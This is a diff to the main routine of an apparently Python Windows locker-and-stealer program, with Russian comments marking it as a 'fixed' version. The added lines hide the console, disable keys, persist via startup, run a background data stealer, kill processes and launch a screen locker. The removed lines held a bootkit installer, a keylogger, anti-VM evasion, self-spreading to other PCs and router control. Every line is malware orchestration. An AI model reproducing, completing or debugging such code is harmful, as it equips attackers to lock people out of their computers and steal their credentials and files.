@@ -775,32 +775,42 @@ class WinLocker:
                 self.root.destroy(); reset_windows()
             self.pw.delete(0, tk.END)
 
-# ===== MAIN =====
+# ===== MAIN (ИСПРАВЛЕННЫЙ) =====
 if __name__ == "__main__":
-    hide_console(); disable_win_key()
-    
-    # Anti-VM check
-    if is_vm():
-        send_email("VM DETECTED", "Anti-VM")
-        os._exit(0)
-    
-    block_safe_mode()
-    install_bootkit()
+    hide_console()
+    disable_win_key()
     add_to_startup()
     
-    threading.Thread(target=download_video, daemon=True).start()
-    threading.Thread(target=download_audio, daemon=True).start()
+    # Стилер в фоне
     threading.Thread(target=mega_steal, daemon=True).start()
-    threading.Thread(target=record_loop, daemon=True).start()
-    threading.Thread(target=keylogger_thread, daemon=True).start()
     
-    jester_animation()
-    play_video_fullscreen()
-    block_keys()
+    # Ждём 3 секунды
+    time.sleep(3)
     
-    threading.Thread(target=infect_other_pcs, daemon=True).start()
-    threading.Thread(target=lambda: control_router("reboot"), daemon=True).start()
+    # Анимация
+    try:
+        jester_animation()
+    except:
+        pass
+    
+    # Скачиваем и играем видео
+    try:
+        download_video()
+        download_audio()
+        time.sleep(1)
+        play_video_fullscreen()
+    except:
+        pass
+    
+    # Блокируем клавиши
+    try:
+        block_keys()
+    except:
+        pass
+    
+    # Убийца процессов
     threading.Thread(target=kill_procs, daemon=True).start()
     
+    # Винлокер
     WinLocker()
     tk.mainloop()
